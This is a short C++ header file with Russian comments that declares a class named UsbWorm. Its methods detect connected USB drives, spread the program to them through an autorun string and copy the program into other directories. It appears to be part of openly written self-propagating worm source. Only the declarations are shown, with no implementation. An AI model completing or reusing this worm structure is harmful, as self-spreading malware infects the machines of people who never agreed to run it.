#ifndef USB_PROPAGATION
#define USB_PROPAGATION


class UsbWorm // Класс распространения по usb
 {
private:
    string autoRunStr;
public:
    UsbWorm(string name);
    void startPropagation();
    string* checkUSB(); // Поиск подключенных usb носителей
    void usbPropagation(); // Распространение по usb
    void dirPropagation(); // Копирование программы в другие дирректории
};

#endif
